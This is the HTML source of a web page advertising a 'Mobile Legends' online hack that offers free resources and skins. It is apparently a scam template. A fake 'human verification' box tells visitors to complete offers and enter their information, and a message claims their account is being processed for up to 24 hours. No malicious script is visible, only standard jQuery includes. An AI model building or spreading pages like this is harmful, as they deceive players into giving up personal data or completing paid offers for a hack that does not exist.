<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta http-equiv="content-language" content="en" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta http-equiv="Cache-Control" content="no-cache" />

<meta name="language" content="en" />
<title>Mobile Legends - Online Hack</title>
<meta name="description" content="Free resource and skins for you! join now!" />
<meta name="keywords" content="" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />

<link rel="stylesheet" href="css/normalize.css"/>
<link rel="stylesheet" href="css/main.css"/>
<script src="js/vendor/modernizr-2.6.2.min.js" type="text/javascript"></script>
<link rel="stylesheet" href="http://code.jquery.com/ui/1.11.2/themes/smoothness/jquery-ui.css"/>

</head>
<body>
<center><img src="img/logo.png"></center>
<div class="tools"><div class="tool">
<header><h1>Mobile Legends</h1></header>
<div class="content">

<div class="offers">
<div class="bubble">
<span style="font-size:13px;color:#FFCC00;text-shadow:#D2D2D2 0 0 1px;">HUMAN VERIFICATION - PROTECTION ANTI-BOT</span><br/>
We need to check that you will not abuse our system, but it is mainly to contribute to the costs related to servers. (Anti-ban, Proxy, etc ...). Choose one of these offers below and fill it with the correct information.
</div>
</div>

<br>
<center>Processing your account. Please wait up to 24 hours.</center>
<br>
<br>
<br>
<div class="generate">
					<div class="light"></div>
					<div class="dark"></div>
					<form action="index.html" method="post">
					<button class="buttons">LOGOUT</button>

        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js" type="text/javascript"></script>
	<script src="http://code.jquery.com/ui/1.11.2/jquery-ui.js" type="text/javascript"></script>
        <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.10.2.min.js"><\/script>')</script>
        <script src="js/plugins.js" type="text/javascript"></script>
        <script src="js/main.js" type="text/javascript"></script>
</html>